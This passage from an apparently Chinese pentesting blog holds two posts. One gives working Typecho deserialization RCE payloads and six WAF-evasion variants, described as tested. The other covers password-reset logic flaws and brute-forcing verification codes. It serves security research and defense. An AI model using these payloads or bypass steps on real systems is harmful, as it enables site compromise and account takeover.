class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="绕过WAF的方式："><a href="#绕过WAF的方式：" class="headerlink" title="绕过WAF的方式："></a>绕过WAF的方式：</h3><p>针对此漏洞，WAF的防御思路应该是根据payload进行base64解码之后的内容做静态内容匹配和正则匹配，比如规则会识别数据包中是否存在Typecho_Request、screenName等字段，但是为了提高识别的精准度和防止误报，应该会加上一些其他的payload特征来达到防御效果，因此下文从攻击者角度介绍几种绕过此类漏洞规则的方法。</p><ul><li><h4 id="序列化字符串之后添加任意内容"><a href="#序列化字符串之后添加任意内容" class="headerlink" title="序列化字符串之后添加任意内容"></a>序列化字符串之后添加任意内容</h4></li></ul><p>序列化字符串之后添加任意字符串不影响序列化结果，如一下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;test_sangfor<br></code></pre></td></tr></table></figure><ul><li><h4 id="在表示长度的数字前添加一个或者多个0"><a href="#在表示长度的数字前添加一个或者多个0" class="headerlink" title="在表示长度的数字前添加一个或者多个0"></a>在表示长度的数字前添加一个或者多个0</h4></li></ul><p>可以在数字前如表示字符串长度的数字之前添加多个0，不影响反序列化结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">0000000007</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="字符串进行HEX编码"><a href="#字符串进行HEX编码" class="headerlink" title="字符串进行HEX编码"></a>字符串进行HEX编码</h4></li></ul><p>上文中提到了s标志与S的区别，即s是表示字符串ASCII字符，S表示字符串HEX编码的值，因此将s转换为hex可以达到一个比较良好的绕过效果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;S:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;\70\68\70\69\6e\66\6f\28\29&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="使用任意字符串代替s之后的分号："><a href="#使用任意字符串代替s之后的分号：" class="headerlink" title="使用任意字符串代替s之后的分号："></a>使用任意字符串代替s之后的分号：</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>AO:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="在数字之前添加一个"><a href="#在数字之前添加一个" class="headerlink" title="在数字之前添加一个+"></a>在数字之前添加一个+</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:+<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><h4 id="使用任意字符替换O之后的"><a href="#使用任意字符替换O之后的" class="headerlink" title="使用任意字符替换O之后的:{"></a>使用任意字符替换O之后的:{</h4></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;adapter&quot;</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Typecho_Feed&quot;</span>:<span class="hljs-number">2</span>AAs:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;Typecho_Feed_type&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;RSS 2.0&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;Typecho_Feed_items&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">5</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;title&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;link&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;date&quot;</span>;i:<span class="hljs-number">1511795201</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;category&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;author&quot;</span>;O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;Typecho_Request&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_params&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;screenName&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;s:<span class="hljs-number">24</span>:<span class="hljs-string">&quot;Typecho_Request_filter&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;prefix&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;typecho_&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>以上绕过方式经测试均为有效绕过</p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP反序列化</tag>
      
      <tag>漏洞挖掘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>身份认证逻辑缺陷漏洞挖掘思路</title>
    <link href="/2020/12/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/"/>
    <url>/2020/12/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在渗透测试项目中，很多时候横在我们渗透路上的第一个拦路虎就是后台登录界面，有时可以通过找弱密码的方式直接获取登录后的权限，有时也可以通过钓鱼或者在其他业务系统中拿到的账户密码来登录目标系统获取更多权限，有时也可以通过未授权访问漏洞来获取本应登录后才能拿到的数据，但是如果没有以上渠道，想要获取一个靶标系统的访问权限就比较难了，因此下文总结身份认证逻辑缺陷相关漏洞挖掘思路。</p><span id="more"></span><h3 id="密码重置逻辑漏洞"><a href="#密码重置逻辑漏洞" class="headerlink" title="密码重置逻辑漏洞"></a>密码重置逻辑漏洞</h3><h4 id="1、任意验证码重置密码"><a href="#1、任意验证码重置密码" class="headerlink" title="1、任意验证码重置密码"></a>1、任意验证码重置密码</h4><ul><li>无验证码验证</li></ul><p>这种漏洞多出现于边缘业务系统（Bug较多，开发人员编码能力差），或者是新上线的系统（逻辑不完善），修改密码时可以不需要验证码或输入任意验证码，真实场景应该比较少见。</p><ul><li>验证码校验逻辑写在前端代码中</li></ul><p>有的业务系统可能将验证码验证的逻辑写在js中，这时找到返回的验证码信息，可能进行加加密，按照代码逻辑还原出原始验证码再输入对应验证码或者通过浏览器调试功能跳过验证逻辑即可。</p><h4 id="2、验证码验证逻辑错误"><a href="#2、验证码验证逻辑错误" class="headerlink" title="2、验证码验证逻辑错误"></a>2、验证码验证逻辑错误</h4><ul><li><strong>未校验验证码与用户的关系</strong></li></ul><p>这个例子比较简单，即攻击者向服务器提交修改密码的请求，服务器向攻击者返回用于修改密码的验证码，但攻击者在修改密码的包中将目标用户从攻击者改为受害者，而服务器并没有校验验证码是否属于目标用户，导致攻击者使用自己的验证码修改了受害者的密码。</p><p>此漏洞在实现较为完善的系统上应该不会出现，而且利用此漏洞需要攻击者拥有一个目标系统的普通账号，如果攻击者没有普通账号权限且无法进行用户注册则无法利用此漏洞。</p><ul><li><strong>修改密码的包可由用户控制且服务器未校验</strong></li></ul><p>对着某系统修改密码逻辑进行抓包时发现在找回密码时，系统会在第一个包中校验用户名与手机号是否匹配，不匹配就无法在浏览器中进行下一步，但是在BurpSuite中可以绕过页面本身的限制，在发送验证码时客户端向服务端发送了用户名和手机号，这一步服务器并没有根据用户ID直接根据存储的手机号信息发送验证码，因此我们可以篡改这一步的手机号信息，将受害者的手机号修改为自己指定的手机号：</p><blockquote><p>图中手机号为某在线短信接收网站中的手机号码</p></blockquote><p><img src="https://i.loli.net/2021/02/09/oCO8nAGhgyHkVPs.png" alt="image.png"></p><p>从自己指定的手机号中获取验证码之后下一步则是验证验证码是否有效，数据包如下，客户端向服务器发送了手机号与验证码，并没有发送用户ID信息，因此这一步并没有校验手机号与用户是否匹配，因为开发人员人为这一步在找回密码的第一步已经校验过了，下图为篡改的手机号与收到的验证码通过服务器认证的步骤：</p><p><img src="https://i.loli.net/2021/02/09/zsP9TV78ZiXuGIr.png" alt="image.png"></p><p>验证码验证成功之后就是修改密码的数据包，这一过程客户端发送的数据包含用户ID、用户手机号、手机验证码、修改的新密码，由于上一个包已经校验了验证码的有效性，因此可以大胆猜测这一步不会再校验验证码是否正确，且这一步需要正确填写受害者的手机号，验证码可以随意填写，密码填写为自己指定的密码，进行发包，果不其然，这一步服务器并没有检查验证码的有效性，密码修改成功。</p><p><img src="https://i.loli.net/2021/02/09/lOq47GyojC2R5Up.png" alt="image-20210106150254745.png"></p><p>导致此问题的根本原因是业务系统在实现的过程中为了降低耦合性或者是为了减少性能开销（如修改密码过程中一次性校验多组数据可能会耗费较多系统资源），将验证步骤进行了分解，正常用户在浏览器中进行操作时这些多步骤验证操作确实可以形成完整的校验逻辑，即用户有任何一步输入错误都会导致密码修改失败，但是攻击者通过BurpSuite等工具可以绕过这些验证逻辑的统一性导致密码认证逻辑漏洞。</p><p>将此攻击过程拓展到通用场景即为：当目标程序在修改密码时没有将所有需要绑定的数据进行一次性（单个数据包）绑定认证时，就有可能存在这样的漏洞。</p><h4 id="3、验证码爆破"><a href="#3、验证码爆破" class="headerlink" title="3、验证码爆破"></a>3、验证码爆破</h4><p>利用爆破的方式来完成任意用户密码重置的前提是验证码验证这一过程可以短时间内重复多次，如果重复几次服务器就限制访问的情况下显然无法采用爆破的方式来突破验证码，以下为验证码可爆破的利用场景。</p><ul><li><strong>验证码有效期较长</strong>（超过规定的有效期但实际还是可用）</li></ul><p>手机或短信的验证码一般情况下会存在有效期，多为5分钟或10分钟，在某些实现相对不完善的业务系统中，点击忘记密码获取验证码时验证码显示的有效时长为5分钟，但业务系统可能并没有及时清除超时的验证码，因此验证码真实有效时间比标注的有效时间更长，甚至多次点击忘记密码之后系统会生成较多有效验证码同时存在于系统验证逻辑中，可以大大增加验证码爆破成功的概率。</p><ul><li><strong>验证码长度短</strong></li></ul><p>验证码长度较短时，一般长度为4，当验证码为数字组成时则验证码生成区间为0000<del>9999共10000种可能性，假设验证码有效期为5分钟，则5分钟内爆破10000次平均每秒发10000 &#x2F; 5 &#x2F; 60 ~&#x3D; <code>33</code>个包，对于服务器压力较大，尤其是在有代理存在的情况下网络延迟较高可能无法达到这样的发包速度，因此可以只爆破一半如爆破0000</del>4999的验证码，发包频率就是原来的一半，但是此时如果验证码生成的区间为5000~9999时则无法成功爆破出验证码，因此可以多爆破几轮，按照概率是可较快爆破出目标验证码完成密码篡改的。</p><h3 id="Cookie通用问题"><a href="#Cookie通用问题" class="headerlink" 